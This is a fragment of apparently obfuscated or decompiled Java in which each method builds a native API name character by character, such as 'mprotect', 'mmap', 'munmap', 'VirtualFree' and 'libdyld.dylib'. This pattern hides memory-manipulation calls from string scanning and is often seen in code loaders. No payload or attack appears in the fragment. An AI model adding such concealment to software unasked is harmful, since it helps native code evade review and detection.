        sb.append('l');
        sb.append('l');
        sb.append('o');
        sb.append('c');
        return sb.toString();
    }
    
    private static String d() {
        final StringBuilder sb;
        (sb = new StringBuilder()).append('l');
        sb.append('i');
        sb.append('b');
        sb.append('d');
        sb.append('y');
        sb.append('l');
        sb.append('d');
        sb.append('.');
        sb.append('d');
        sb.append('y');
        sb.append('l');
        sb.append('i');
        sb.append('b');
        return sb.toString();
    }
    
    private static String e() {
        final StringBuilder sb;
        (sb = new StringBuilder()).append('V');
        sb.append('i');
        sb.append('r');
        sb.append('t');
        sb.append('u');
        sb.append('a');
        sb.append('l');
        sb.append('F');
        sb.append('r');
        sb.append('e');
        sb.append('e');
        return sb.toString();
    }
    
    private static String f() {
        final StringBuilder sb;
        (sb = new StringBuilder()).append('m');
        sb.append('u');
        sb.append('n');
        sb.append('m');
        sb.append('a');
        sb.append('p');
        return sb.toString();
    }
    
    private static String g() {
        final StringBuilder sb;
        (sb = new StringBuilder()).append('m');
        sb.append('p');
        sb.append('r');
        sb.append('o');
        sb.append('t');
        sb.append('e');
        sb.append('c');
        sb.append('t');
        return sb.toString();
    }
    
    private static String h() {
        final StringBuilder sb;
        (sb = new StringBuilder()).append('m');
        sb.append('m');
        sb.append('a');
        sb.append('p');
        return sb.toString();
    }
}
